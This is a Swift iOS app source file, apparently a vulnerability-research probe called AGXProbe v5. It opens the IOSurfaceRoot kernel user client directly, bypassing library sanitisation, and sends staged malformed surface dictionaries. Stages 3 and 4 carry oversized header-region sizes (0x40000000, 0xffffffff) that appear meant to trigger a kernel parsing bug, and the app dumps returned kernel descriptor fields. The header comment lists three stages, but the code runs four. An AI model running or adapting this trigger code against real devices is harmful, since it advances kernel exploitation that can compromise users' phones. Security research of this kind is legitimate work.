//
//  ContentView.swift
//  AGXProbe — v5: direct IOSurfaceRoot user-client route
//
//  Why: libIOSurface sanitises the property dictionary, so the kernel parser
//  (and its gated per-slice validation) is never entered via IOSurfaceCreate.
//  The A16/27.3β F1 transcript instead drove the user client directly:
//      IOServiceOpen("IOSurfaceRoot")            -> kr=0
//      IOConnectCallMethod(sel=0, XML 1751 B)    -> out=0xc68
//  This probe reproduces that route on t8150 / 27.0.1.
//
//  METHOD
//   1. open IOSurfaceRoot (type 0)
//   2. serialize a property dictionary to XML via PropertyListSerialization
//   3. call selector 0 with the XML as structure input, 0xc68 output buffer
//   4. decode base / id / alloc / height from the output descriptor
//
//  Escalation is staged:
//   stage 1: benign geometry (must succeed for the route to be valid)
//   stage 2: F1-shaped geometry, modest header
//   stage 3: F1 header = 0x40000000, sliceCount = 4
//
//  SAFETY: creation only. No Metal, no GPU submission, no writes to any
//  surface, no cross-object attempt. If stage 1 fails we stop there.
//

import SwiftUI
import Darwin

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = GeomViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe — v5 IOSurfaceRoot").font(.headline)
            Text("iPhone18,1 / t8150 / iOS 27.0.1 (24A446)")
                .font(.caption2).foregroundColor(.secondary)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runProbe() } }) {
                Text(vm.isRunning ? "Probing…" : "Run v5")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.blue).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

@MainActor
final class GeomViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false

    private var didAutoRun = false
    private let PF_BGRA: UInt32 = 0x42475241
    private let OUT_SIZE = 0xc68

    private var logFileURL: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("geom5.log")
    }

    private func log(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        guard ProcessInfo.processInfo.arguments.contains("--autorun") else { return }
        await runProbe()
    }

    // ------------------------------------------------------------------

    private func dictXML(_ d: [String: Any]) -> Data? {
        do {
            return try PropertyListSerialization.data(
                fromPropertyList: d, format: .xml, options: 0)
        } catch {
            log("plist serialization failed: \(error)")
            return nil
        }
    }

    private func openRoot() -> io_connect_t? {
        let service = IOServiceGetMatchingService(
            kIOMainPortDefault, IOServiceMatching("IOSurfaceRoot"))
        guard service != 0 else {
            log("IOServiceGetMatchingService(IOSurfaceRoot) = NULL")
            return nil
        }
        defer { IOObjectRelease(service) }
        var conn: io_connect_t = 0
        let kr = IOServiceOpen(service, mach_task_self_, 0, &conn)
        log(String(format: "IOServiceOpen(IOSurfaceRoot, type 0) kr=0x%x conn=0x%x",
                   kr, conn))
        return kr == 0 ? conn : nil
    }

    private func call(conn: io_connect_t, selector: UInt32,
                      xml: Data, tag: String) -> UnsafeMutableRawPointer? {
        let out = UnsafeMutableRawPointer.allocate(byteCount: OUT_SIZE, alignment: 8)
        memset(out, 0, OUT_SIZE)
        var outLen = OUT_SIZE
        let kr: kern_return_t = xml.withUnsafeBytes { raw in
            IOConnectCallStructMethod(conn, selector,
                                      raw.baseAddress, xml.count,
                                      out, &outLen)
        }
        log(String(format: "%@: sel=%u xml=%lu kr=0x%x outLen=0x%lx",
                   tag, selector, xml.count, kr, outLen))
        if kr != 0 {
            out.deallocate()
            return nil
        }
        return out
    }

    private func describe(_ p: UnsafeMutableRawPointer, _ tag: String) {
        let base = p.loadUnaligned(fromByteOffset: 0, as: UInt64.self)
        let idv  = p.loadUnaligned(fromByteOffset: 0x18, as: UInt64.self)
        let alloc = p.loadUnaligned(fromByteOffset: 0x20, as: UInt64.self)
        let h    = p.loadUnaligned(fromByteOffset: 0x28, as: UInt64.self)
        log(String(format: "%@: desc base=0x%llx id=%llu alloc=0x%llx h=%llu",
                   tag, base, idv, alloc, h))
        var hex = ""
        for i in 0..<0x80 {
            if i % 16 == 0 { hex += String(format: "\n  %04x: ", i) }
            hex += String(format: "%02x ", p.loadUnaligned(fromByteOffset: i, as: UInt8.self))
        }
        log(hex)
    }

    private func plane(_ extra: [String: Any] = [:]) -> [String: Any] {
        var p: [String: Any] = [
            "IOSurfacePlaneWidth": 64,
            "IOSurfacePlaneHeight": 64,
            "IOSurfacePlaneBytesPerRow": 256,
            "IOSurfacePlaneBytesPerElement": 4,
            "IOSurfacePlaneOffset": 0,
            "IOSurfacePlaneSize": 0x4000,
        ]
        for (k, v) in extra { p[k] = v }
        return p
    }

    private func base(_ alloc: Int, _ planes: [[String: Any]],
                      _ extra: [String: Any] = [:]) -> [String: Any] {
        var d: [String: Any] = [
            "IOSurfaceWidth": 64,
            "IOSurfaceHeight": 64,
            "IOSurfaceBytesPerElement": 4,
            "IOSurfaceBytesPerRow": 256,
            "IOSurfaceAllocSize": alloc,
            "IOSurfacePixelFormat": PF_BGRA,
            "IOSurfacePlaneInfo": planes,
        ]
        for (k, v) in extra { d[k] = v }
        return d
    }

    // ------------------------------------------------------------------

    func runProbe() async {
        isRunning = true; status = "Running…"; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)

        log("=== AGXProbe v5 — direct IOSurfaceRoot === build 24A446 / t8150")
        log("SAFETY: creation only; no Metal, no writes, no cross-object attempt")

        guard let conn = openRoot() else {
            log("cannot open IOSurfaceRoot; stopping"); status = "Failed"
            isRunning = false; return
        }
        defer { IOServiceClose(conn) }

        // --- stage 1: benign geometry --------------------------------
        log("\n--- stage 1: benign dict ---")
        let benign = base(0x4000, [plane()])
        guard let xml1 = dictXML(benign) else { status = "Failed"; isRunning = false; return }
        guard let out1 = call(conn: conn, selector: 0, xml: xml1, tag: "S1 sel0") else {
            log("stage 1 failed -> route not usable with this input shape; stopping")
            status = "Failed"; isRunning = false; return
        }
        describe(out1, "S1")
        out1.deallocate()

        // --- stage 2: F1-shaped, modest header -----------------------
        log("\n--- stage 2: F1-shaped, headerPerSlice=0x4000 ---")
        let p2 = plane([
            "IOSurfacePlaneBytesPerTileData": 0x1000,
            "IOSurfacePlaneBytesPerRowOfTileData": 0x200,
            "IOSurfacePlaneDataRegionBytesPerSlice": 0x4000,
            "IOSurfacePlaneHeaderRegionBytesPerSlice": 0x4000,
        ])
        let d2 = base(0x10000, [p2], ["IOSurfaceSliceCount": 4])
        if let xml2 = dictXML(d2) {
            if let out2 = call(conn: conn, selector: 0, xml: xml2, tag: "S2 sel0") {
                describe(out2, "S2"); out2.deallocate()
            }
        }

        // --- stage 3: the F1 value -----------------------------------
        log("\n--- stage 3: F1 headerPerSlice=0x40000000, sliceCount=4 ---")
        let p3 = plane([
            "IOSurfacePlaneBytesPerTileData": 0x1000,
            "IOSurfacePlaneBytesPerRowOfTileData": 0x200,
            "IOSurfacePlaneDataRegionBytesPerSlice": 0x4000,
            "IOSurfacePlaneHeaderRegionBytesPerSlice": 0x40000000,
        ])
        let d3 = base(0x10000, [p3], ["IOSurfaceSliceCount": 4])
        if let xml3 = dictXML(d3) {
            if let out3 = call(conn: conn, selector: 0, xml: xml3, tag: "S3 sel0") {
                describe(out3, "S3"); out3.deallocate()
            }
        }

        // --- stage 4: gated keys + huge header -----------------------
        log("\n--- stage 4: gated keys + header=0x40000000 ---")
        let p4 = plane([
            "IOSurfacePlaneCompressedTileHeaderRegionOffset": 0,
            "IOSurfacePlaneCompressedTileDataRegionOffset": 0x2000,
            "IOSurfacePlaneBytesPerTileData": 0x1000,
            "IOSurfacePlaneBytesPerRowOfTileData": 0x200,
            "IOSurfacePlaneDataRegionBytesPerSlice": 1,
            "IOSurfacePlaneHeaderRegionBytesPerSlice": 0xffffffff,
        ])
        let d4 = base(0x10000, [p4], ["IOSurfaceSliceCount": 4])
        if let xml4 = dictXML(d4) {
            if let out4 = call(conn: conn, selector: 0, xml: xml4, tag: "S4 sel0") {
                describe(out4, "S4"); out4.deallocate()
            }
        }

        log("\n=== done ===")
        status = "Complete"; isRunning = false
    }
}
